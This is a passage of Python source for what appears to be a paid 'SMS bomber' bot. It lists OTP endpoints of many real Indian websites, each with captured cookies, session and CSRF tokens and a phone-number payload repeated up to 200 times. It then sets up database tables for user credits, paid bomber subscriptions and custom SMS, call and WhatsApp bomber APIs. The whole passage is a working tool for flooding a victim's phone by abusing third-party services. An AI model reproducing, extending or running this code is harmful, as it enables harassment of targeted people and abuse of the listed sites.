_ga_YN0TX18PEE=GS1.1.1715943268.1.0.1715943268.0.0.0; _ga=GA1.1.972140952.1715943256; WZRK_G=fd462bffc0674ad3bdf9f6b7c537c6c7; WZRK_S_445-488-5W5Z=%7B%22p%22%3A1%2C%22s%22%3A1715943284%2C%22t%22%3A1715943283%7D",
            "origin": "https://www.licious.in",
            "priority": "u=1, i",
            "referer": "https://www.licious.in/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "serverside": "false",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "x-csrf-token": ""
        },
        "data": lambda phone: json.dumps({"phone": phone, "captcha_token": None}),
        "count": 3
    },
    
    {
        "url": "https://api.gopaysense.com/users/otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "WZRK_G=466bfb3ffeed42af94539ddb75aab1a3; WZRK_S_8RK-99W-485Z=%7B%22p%22%3A1%2C%22s%22%3A1716292040%2C%22t%22%3A1716292041%7D; _ga=GA1.2.470062265.1716292041; _gid=GA1.2.307457907.1716292041; _gat_UA-96384581-2=1; _fbp=fb.1.1716292041396.1682971378; _uetsid=e4457600176711efbd4505b1c7173542; _uetvid=e445bdd0176711efbe4db167d99f3d78; _ga_4S93MBNNX8=GS1.2.1716292043.1.0.1716292052.51.0.0; _ga_F7R96SWGCB=GS1.1.1716292040.1.1.1716292052.0.0.0",
            "origin": "https://www.gopaysense.com",
            "priority": "u=1, i",
            "referer": "https://www.gopaysense.com/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 10
    },
    
    {
        "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "access-control-allow-methods": "GET, POST, PUT, DELETE",
            "content-type": "application/json",
            "cookie": "AMCVS_1CEE09F45D761AFF0A495E2D%40AdobeOrg=1; AMCV_1CEE09F45D761AFF0A495E2D%40AdobeOrg=179643557%7CMCIDTS%7C19865%7CMCMID%7C58822726746254564151447357050729602323%7CMCAAMLH-1716898290%7C12%7CMCAAMB-1716898290%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1716300690s%7CNONE%7CvVersion%7C5.5.0; s_cc=true; user_sid=s%3ATQ0qv4hLT153wuEftXkOFpeoaD4f3RcC.Pf2awi603%2BgCd0vFyqddzywhbtBrgq77GVj9pyt7DLA; _gcl_aw=GCL.1716293504.EAIaIQobChMIqN7yuduehgMVXCSDAx3VPw8_EAAYASAAEgLhQPD_BwE; AMP_TOKEN=%24NOT_FOUND; _gid=GA1.2.1283593062.1716293508; _gat_UA-65947081-1=1; _ga_V1GYNRLK0T=GS1.1.1716293509.1.0.1716293509.60.0.0; _fbp=fb.1.1716293510686.1114094958; _ga=GA1.2.1383706961.1716293508; _gac_UA-65947081-1=1.1716293517.EAIaIQobChMIqN7yuduehgMVXCSDAx3VPw8_EAAYASAAEgLhQPD_BwE; _gcl_au=1.1.1857621863.1716293504.492344148.1716293509.1716293517; gpv_V9=moglix%3Asignup%20form; s_nr=1716293519104-New; s_sq=%5B%5BB%5D%5D",
            "origin": "https://www.moglix.com",
            "priority": "u=1, i",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"email": "", "phone": phone, "type": "p", "source": "signup", "buildVersion": "DESKTOP-7.3", "device": "desktop"}),
        "count": 7
    },
    
    {
        "url": "https://oxygendigitalshop.com/graphql",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "PHPSESSID=kpqtnpvmdp4k43tcgdopos8e88; _gcl_au=1.1.309357057.1716293827; _clck=1gmll5w%7C2%7Cfly%7C0%7C1602; _ga=GA1.2.1318673831.1716293828; _gid=GA1.2.1588528699.1716293829; _gat_UA-179241331-1=1; _fbp=fb.1.1716293829956.1718674954; private_content_version=09b3c0c64a967be3c44ffa5b45edc234; _ga_M4N3E3FN0Z=GS1.1.1716293827.1.1.1716293856.31.0.0; _clsk=c5rolk%7C1716293857454%7C4%7C1%7Ci.clarity.ms%2Fcollect",
            "origin": "https://oxygendigitalshop.com",
            "priority": "u=1, i",
            "referer": "https://oxygendigitalshop.com/my-account",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"operationName": "sendRegistrationOtp", "variables": {"email_or_otp": f"+91{phone}", "isResend": False, "token": "03AFcWeA47pl14PFJtz3PaIyTLlRVG0gBdqirpf5kuLCM3Ue63bo30D5xtt3OngezeoBlB3kVH6x8AtyIRK-K6_WOXHx4W4bGNY4803bh8kpzibb2hUbjPTE780Kr1Gh7fVuZvTtsS-osUhhLAWsc3H8Fp3JFnFQi3u4gtZ_ARIQtzAUWp9p8Qt4nDsrM2fwtX9uC0SYz78n1EEXoIstjuEedvgPGsC7xqnwWBwySpW2tAGvVYIQzk6uloXuCUM9CLogsdYPt5_8G437Em9CO-I1SmQCyniCF0UDzfYGUl8pzIBSbWLzZdj4DvFkVHOHytFd6UvjqjTyuoT2RQI-KKXI9wJDGXwtbQOakjRLKE-SymDCD0k6GPQvjNJcbqhk-NMVckwSHLP3muLKQRI9EBKB4t3IjTCHoVyPMF0eLg4J5raYeukU0b0rwoOCoDs7_5uyLCc8qzIBh6LHywWirQJ-m1HvNyfsOvBX-d8_bWT7MIPKFflQfd_DnZKDyrFrRRMVQKiXeSVIRhEAZDIJul5f7Ns-t5isfYOU8-dcANSC1VJeMSPZBkXtKKvSXXYM9vtc7V59nhPyv7LU5v_wpZ2KwOHj7dybDeVr2ELZARDI1tc_NMxZy9HMrLuGhscKa1kSy29v0tpBqtU-l7vIB-1qLT-G3kxHJE4fdv9TL973FPzbEpz03wusN5YomS0hv31VhRPr-qDHBzmj-O1gyPxlEhPkNSPuiPwg"}, "query": "mutation sendRegistrationOtp($token: String!, $email_or_otp: String!, $isResend: Boolean!) {\n  sendRegistrationOtp(token: $token, value: $email_or_otp, is_resend: $isResend)\n}\n"}),
        "count": 7
    },
    
    {
        "url": "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "client": "web",
            "content-type": "application/json",
            "course": "general-interest",
            "origin": "https://www.upgrad.com",
            "priority": "u=1, i",
            "referer": "https://www.upgrad.com/",
            "referrer": "https://www.google.com/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phoneNumber": f"+91{phone}"}),
        "count": 10
    },
    
    {
        "url": "http://www.pinknblu.com/v1/auth/generate/otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "laravel_session=eyJpdiI6IlBkMkhkZnN3NWpmSE9vQ3Q2VUlyTXc9PSIsInZhbHVlIjoiWHZQTE1HYmhyUTljcWk1NVhyN3hUUkZvYituYzVHclA5NHZ4RHlvaEJNcnNIdENIUmJ6RVNnbjU2bEh5YUE4VVExRzZnRjArK01ZWm4yRmFmZGtobXY0aUw2ZEVaVk1takZKSSt1OW8wcGt6NmZKT1hcL3FlaTd1WjhaemNKXC9tQSIsIm1hYyI6ImRiNTViNjJhZjRjNTE4MWFjMTE4OGYxNWU3M2ExZTAyM2Q3OGVhYTY1NjVhNGY0ZWI3MDQ5YmVjM2M1MGNiYTAifQ%3D%3D; _ga=GA1.1.173966415.1716892374; _gcl_au=1.1.1212519590.1716892374; _fbp=fb.1.1716892385789.994456642; _ga_S6S2RJNH92=GS1.1.1716892373.1.1.1716892425.0.0.0; _ga_8B7LH5VE3Z=GS1.1.1716892374.1.1.1716892425.0.0.0",
            "Origin": "http://www.pinknblu.com",
            "Referer": "http://www.pinknblu.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest"
        },
        "data": lambda phone: f"_token=HvvCsMqCY6poDB4GYPd2DJxewZ6H6TWPMHt8hfEV&country_code=%2B91&phone={phone}",
        "count": 50
    },
    
    {
        "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-IN",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "cookie": "_gid=GA1.2.390459560.1717491496; sid=OF6ijMUYe94BAJPF2m5KGXveYuKyBSVwv+8eUiBFoetQsOwBEf29e+ZR5RacCERPDWwsGifGpzmIdknNx7TaCkm4; mp_a67dbaed1119f2fb093820c9a14a2bcc_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A18fa628beb42fc6-0b4da1b51d2b74-26001c51-100200-18fa628beb42fc6%22%2C%22%24device_id%22%3A%20%2218fa628beb42fc6-0b4da1b51d2b74-26001c51-100200-18fa628beb42fc6%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%2C%22mps%22%3A%20%7B%7D%2C%22mpso%22%3A%20%7B%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D%2C%22mpus%22%3A%20%7B%7D%2C%22mpa%22%3A%20%7B%7D%2C%22mpu%22%3A%20%7B%7D%2C%22mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%7D; _gat_gtag_UA_180706540_1=1; WZRK_S_8R9-67W-W75Z=%7B%22p%22%3A1%7D; _ga_VDVX6P049R=GS1.1.1717491507.1.0.1717491507.0.0.0; _ga=GA1.1.393162471.1716479639",
            "origin": "https://auth.udaan.com",
            "priority": "u=1, i",
            "referer": "https://auth.udaan.com/login/v2/mobile?cid=udaan-v2&cb=https%3A%2F%2Fudaan.com%2F_login%2Fcb&v=2",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "traceparent": "00-db9fd114c85d50d740faf1697fafe008-10128c0be7778059-00",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "x-app-id": "udaan-auth"
        },
        "data": lambda phone: f"mobile={phone}",
        "count": 3
    },
    
    {
        "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
        "method": "POST",
        "headers": {
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "client-version": "300",
            "Authorization": "Bearer",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Referer": "https://www.xylem.live/",
            "randomId": "bfc4e54e-1873-48cc-823e-40d401d9dbb4",
            "client-id": "64254d66be2a390018e6d348",
            "client-type": "WEB",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: json.dumps({"mobile": phone, "countryCode": "+91", "firstName": "Anant Ambani"}),
        "count": 50
    },
    
    {
        "url": "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "baggage": "sentry-environment=production,sentry-release=02102023,sentry-public_key=826f347c1aa641b6a323678bf8f6290b,sentry-trace_id=5631cb3b0d6c45f7bbe6cad72d259956",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": "cloudfront-viewer-address=60.243.56.169%3A50469; cloudfront-viewer-country=IN; cloudfront-viewer-latitude=12.89960; cloudfront-viewer-longitude=80.22090; headerFalse=false; isMobile=false; deviceType=web; js_enabled=true; nbcr=bangalore; nbpt=RENT; nbSource=www.google.com; nbMedium=organic; nbCampaign=https%3A%2F%2Fwww.google.com%2F; _fbp=fb.1.1717523419577.584874862107093753; __zlcmid=1M6mlnN1oPHJHpz; _gcl_au=1.1.1317100846.1717523446; moe_uuid=066d95a8-7171-4415-bb99-8c3208dd358a; _gid=GA1.2.1017913527.1717523447; _gat_UA-46762303-1=1; nbDevice=desktop; mbTrackID=f80f8a7ed66e49bd94ecb36eb4ec1231; JSESSION=a00e843f-c089-4974-bf93-187b368b5fd6; _ga=GA1.2.1392560530.1717523447; _ga_BS11V183V6=GS1.1.1717523448.1.0.1717523449.0.0.0; SPRING_SECURITY_REMEMBER_ME_COOKIE=RE5nY1B6emFITDNROURiK3Q3bGUxZz09OmVhNHhhMmFtdGtYK3lCU0d3VVZFelE9PQ; nbccc=ce1dab2af6f44009bd5b52e763f82eb6; loggedInUserStatus=new; _f_au=eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJodHRwczovL2lkZW50aXR5dG9vbGtpdC5nb29nbGVhcGlzLmNvbS9nb29nbGUuaWRlbnRpdHkuaWRlbnRpdHl0b29sa2l0LnYxLklkZW50aXR5VG9vbGtpdCIsImV4cCI6MTcxNzUyNzA5NSwiaWF0IjoxNzE3NTIzNDk1LCJpc3MiOiJub2Jyb2tlci1maXJlYmFzZUBuby1icm9rZXIuaWFtLmdzZXJ2aWNlYWNjb3VudC5jb20iLCJzdWIiOiJub2Jyb2tlci1maXJlYmFzZUBuby1icm9rZXIuaWFtLmdzZXJ2aWNlYWNjb3VudC5jb20iLCJ1aWQiOiI4YTlmODVjMzhmZTQzNWFhMDE4ZmU0NjBiYWUwMGE1NCJ9.MrM3GFgrPEXnRagMOJDt6qUWkJDGts7uqpGV_o9fp9GHhyxYEnfwglMuc_tjA0wUFi79z376sLUIhVB8RsFHmueWEkxFRhaWcHXpj0CoiwYrKfY-h1PlxxwK6CiqFj0KXlcF21y_bulFwdBGtJzRY4vsYIdDpZI5eIv9wZip2e1i8aQXrHrcQNaZBcnI8a9kyelHeaSsQrkLKcX1ujan-beemsh4H0InDVLTGlYgXKgnQZlN5Ee5eZjlASbwYu7UdkHhanQN9XSJNqPyG2P7gGuN3Ma8z3_WXcslVcAzO0kJqozOAg3eyuqkPVttvliYZf4Hw5as-NbtXDI6mqvZ2A; _ud_check=true; _ud_basic=true; _ud_login=true; _ga_SQ9H8YK20V=GS1.1.1717523447.1.1.1717523496.11.0.502991464",
            "origin": "https://www.nobroker.in",
            "priority": "u=1, i",
            "referer": "https://www.nobroker.in/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sentry-trace": "5631cb3b0d6c45f7bbe6cad72d259956-8b4734b3007bc507",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f"phone=%2B91{phone}",
        "count": 50
    },
    
    {
        "url": "https://www.tyreplex.com/includes/ajax/gfend.php",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "PHPSESSID=t2p0nhdq0lr9urakmratq4nd1o; _gcl_au=1.1.1418022926.1715621870; _gid=GA1.2.1238691204.1715621871; _gat_UA-144475494-1=1; gads=ID=f63744b23745a70c:T=1715621871:RT=1715621871:S=ALNI_MZBf13VT4bNVBfKOHbiZhJ3r9u5yA; gpi=UID=00000e1a8fc4f354:T=1715621871:RT=1715621871:S=ALNI_MYs8bPQMcoLAM5g-TX_h9lYl29HMA; __eoi=ID=8128f50e3278b1a5:T=1715621871:RT=1715621871:S=AA-AfjYrJcEbaBWGnMYqCRZith_o; dyn_cookie=true; v_type_id=3; _ga=GA1.2.110565510.1715621871; utm_source=Direct; firstUTMParamter=Direct#null#null; lastUTMParamter=Direct#null#null; landing_url=https://www.tyreplex.com/login; la_abbr=LOGIN; la_abbr_d=Login Page; la_c=login; la_default_city_id=1630; la_default_pincode=110001; la_default_pincode_display=110001, New Delhi; la_load_more_after_records=8; la_ajax_load_more_records=8; la_match_v_variants=; pv_abbr=LOGIN; pv_abbr_d=Login Page; pv_c=login; pv_default_city_id=1630; pv_default_pincode=110001; pv_default_pincode_display=110001, New Delhi; pv_load_more_after_records=8; pv_ajax_load_more_records=8; pv_match_v_variants=; _fbp=fb.1.1715621882325.2109963301; _ga_K6EJPW0E8D=GS1.1.1715621871.1.1.1715621890.41.0.0; city_id=1630; default_city_id=1630; pincode=110086; manual_city_selected=1",
            "Origin": "https://www.tyreplex.com",
            "Referer": "https://www.tyreplex.com/login",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: f"perform_action=sendOTP&mobile_no={phone}&action_type=order_login",
        "count": 3
    },
    
    {
        "url": "https://vidyakul.com/signup-otp/send",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": "vidyakul_selected_languages=eyJpdiI6ImF1QUVZTjlSaXlxWkVZeUVJT0puNFE9PSIsInZhbHVlIjoiM2UwTExVUmxnNGYyZW1jeEhZYmgyS1wvdEJIdmw1dzFwSnJZWUhGdmF6U009IiwibWFjIjoiOGM3NTBlYjQ1Y2JjODJjYmU1ZGY1Y2EyNTc4YWI0Mzc1YmRmYWRkZTY5Y2QzMjY3NjExOTRiMGVlMmVhMGU4MiJ9; _gcl_au=1.1.1032572450.1715943378; XSRF-TOKEN=eyJpdiI6IjViN3I2Q0h4aG02XC9TVjUwZjdkcklnPT0iLCJ2YWx1ZSI6InF4bDk0RHhMRHhjcVJsVTlPYnk4MHlWaGJcL210N2poZ3JpaldpdlQ1YVwvUTFsSFwvU2lTV1BERWNFTFR4eTJkUnVsclNxMzJUN3VoRjh0cWI4bjdWMEVBPT0iLCJtYWMiOiI3YzJmZGY5NTMzMGQ3MmMwZGExYTEwNDc1MTk3MzVkOTE4ODk1YmI3NTJiZjViNGRmYThiOGVlZGU2YWNmNzg5In0%3D; vidyakul_session=eyJpdiI6IjdHamVPRmNoY1NwS0QzaVJNTFpSZGc9PSIsInZhbHVlIjoiM2Uxc2lnQThTR0tObHBCbFo1Z01tS1kxejM2TjRQNEFlNGhzT05ieEpodzFURVBcL3lJU01oYlRcLzFuUDlmT3RVWTF3ZERJSlN1SSttWHpYazExNDJOUT09IiwibWFjIjoiYmY0NDU0ODMxZTcyZTM2NGFkZmExNmM0YjU3OTY4MmUxNTg5ODM0NWY0NTM1ZWFhODJhMGEyODY0ZTYxNDBjZCJ9; vidyakul_selected_stream=eyJpdiI6Inc3cHVkS05wRm1KTVBJVjhpWmRORlE9PSIsInZhbHVlIjoib3E1aHk0bWJMak9UZGs3NmtJQ0hOcXN0XC9Bdm16YmpUT1NOVFRjQ21QaGc9IiwibWFjIjoiMGNhYzBjMjQyN2E0NmY5NGRkYTQwZjlhOTE4ZDMxNzAyYzNiMmFlYWMxMTg5MzRkZWExY2I1NDA1MjQwMzM5MiJ9; initialTrafficSource=utmcsr=google|utmcmd=organic|utmccn=(not set)|utmctr=(not provided); utmzzses=1; trustedsite_visit=1; WZRK_S_4WZ-K47-ZZ6Z=%7B%22p%22%3A1%7D; _hjSessionUser_2242206=eyJpZCI6IjYxZTE2NGEyLTc0ZDYtNTQ3NS04NDIyLTg0MTYwNDhmMDhhYSIsImNyZWF0ZWQiOjE3MTU5NDMzOTQ1ODksImV4aXN0aW5nIjpmYWxzZX0=; _hjSession_2242206=eyJpZCI6ImI0NGUwMmRkLTlhMjktNDJjMi1hMjA4LTdmYWE0NGFhNTYxYiIsImMiOjE3MTU5NDMzOTQ2MTQsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _fbp=fb.1.1715943395600.1219722189; _ga=GA1.2.2084879805.1715943396; _gid=GA1.2.840887730.1715943396; _gat_UA-106550841-2=1; _ga_53F4FQTTGN=GS1.2.1715943400.1.0.1715943400.60.0.0; ajs_anonymous_id=e2b40642-510a-4751-82ba-9f4a307f6488; mp_d3dd7e816ab59c9f9ae9d76726a5a32b_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A18f863276877d02-084cb1dab8c848-26001c51-100200-18f863276877d03%22%2C%22%24device_id%22%3A%20%2218f863276877d02-084cb1dab8c848-26001c51-100200-18f863276877d03%22%2C%22mp_lib%22%3A%20%22Segment%3A%20web%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%2C%22mps%22%3A%20%7B%7D%2C%22mpso%22%3A%20%7B%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D%2C%22mpus%22%3A%20%7B%7D%2C%22mpa%22%3A%20%7B%7D%2C%22mpu%22%3A%20%7B%7D%2C%22mpr%22%3A%20%5B%5D%2C%22mpap%22%3A%20%5B%5D%7D",
            "origin": "https://vidyakul.com",
            "priority": "u=1, i",
            "referer": "https://vidyakul.com/class-12th/test-series",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-csrf-token": "el0GIsHQSO3Y4upLoQOm3coVWNEiNtiKJONg2LJx",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": lambda phone: f"phone={phone}",
        "count": 3
    },
    
    {
        "url": "https://api.woodenstreet.com/api/v1/register",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://www.woodenstreet.com",
            "priority": "u=1, i",
            "referer": "https://www.woodenstreet.com/",
            "sec-ch-ua": '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"firstname": "Astres", "email": "abcdhbdgud77dd@gmail.com", "telephone": phone, "password": "abcd@gmail.com#%fd", "isGuest": 0, "pincode": "110001", "lastname": "", "customer_id": ""}),
        "count": 200
    },
    
    {
        "url": "https://www.bharatloan.com/login-sbm",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "ci_session=pnui9tc6o5q1upng9gj21d0dqvdna36a; _ga=GA1.1.926584566.1759828023; _gcl_au=1.1.105500372.1759828023; _fbp=fb.1.1759828025039.398634452552158052; _ga_EWGNR5NDJB=GS2.1.s1759828023$o1$g1$t1759828028$j55$l0$h0",
            "Origin": "https://www.bharatloan.com",
            "Referer": "https://www.bharatloan.com/apply-now",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: f"mobile={phone}&current_page=login&is_existing_customer=2",
        "count": 200
    }
]

# --- DATABASE FUNCTIONS ---
def init_database():
    conn = sqlite3.connect('bot_users.db')
    cursor = conn.cursor()
    
    # Users Table
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        first_name TEXT,
        credits INTEGER DEFAULT 5,
        joined_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        last_used TIMESTAMP,
        last_bonus TIMESTAMP,
        is_paid_bomber BOOLEAN DEFAULT 0,
        bomber_trial_used BOOLEAN DEFAULT 0,
        bomber_expire_date TIMESTAMP
    )
    ''')
    
    # Migrations
    try: cursor.execute('ALTER TABLE users ADD COLUMN last_bonus TIMESTAMP')
    except: pass
    try: cursor.execute('ALTER TABLE users ADD COLUMN is_paid_bomber BOOLEAN DEFAULT 0')
    except: pass
    try: cursor.execute('ALTER TABLE users ADD COLUMN bomber_trial_used BOOLEAN DEFAULT 0')
    except: pass
    try: cursor.execute('ALTER TABLE users ADD COLUMN bomber_expire_date TIMESTAMP')
    except: pass

    # NEW: Group Credits Table
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS group_credits (
        group_id INTEGER PRIMARY KEY,
        group_name TEXT,
        credits INTEGER DEFAULT 0,
        added_by INTEGER,
        added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    
    # NEW: Group Members Table (to track which users are in which group)
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS group_members (
        user_id INTEGER,
        group_id INTEGER,
        joined_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        PRIMARY KEY (user_id, group_id)
    )
    ''')

    # NEW: Custom Bomber APIs Table
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS custom_bomber_apis (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        api_name TEXT,
        api_url TEXT NOT NULL,
        api_method TEXT DEFAULT 'POST',
        api_headers TEXT,
        api_data TEXT,
        api_count INTEGER DEFAULT 1,
        api_type TEXT DEFAULT 'sms',  -- sms, call, whatsapp
        added_by INTEGER,
        added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
